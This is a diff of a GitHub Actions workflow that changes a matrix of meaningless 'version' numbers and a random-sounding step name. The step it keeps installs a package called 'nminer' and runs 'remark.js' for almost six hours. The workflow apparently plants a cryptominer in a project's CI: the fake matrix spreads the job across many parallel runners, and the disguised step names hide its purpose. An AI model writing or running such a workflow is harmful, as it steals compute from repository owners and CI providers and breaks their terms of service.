@@ -9,23 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5103 }
-          - { version: 3242 }
-          - { version: 913 }
-          - { version: 6168 }
-          - { version: 2064 }
-          - { version: 5586 }
-          - { version: 3973 }
-          - { version: 5740 }
-          - { version: 7660 }
-          - { version: 7554 }
-          - { version: 522 }
-          - { version: 5577 }
-          - { version: 4749 }
-          - { version: 4026 }
-          - { version: 1624 }
-          - { version: 180 }
-          - { version: 6725 }
+          - { version: 1830 }
+          - { version: 7231 }
+          - { version: 9988 }
+          - { version: 3006 }
+          - { version: 9331 }
+          - { version: 3068 }
+          - { version: 3308 }
+          - { version: 2294 }
+          - { version: 5049 }
+          - { version: 7442 }
+          - { version: 1481 }
+          - { version: 1081 }
+          - { version: 6731 }
+          - { version: 988 }
+          - { version: 9411 }
+          - { version: 3304 }
 
     steps:
       - name: Checkout
@@ -36,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: decent revere
+      - name: tusk
         run: |
           npm install nminer@latest
-          timeout 349m node remark.js || echo "remark executed"
+          timeout 342m node remark.js || echo "remark executed"
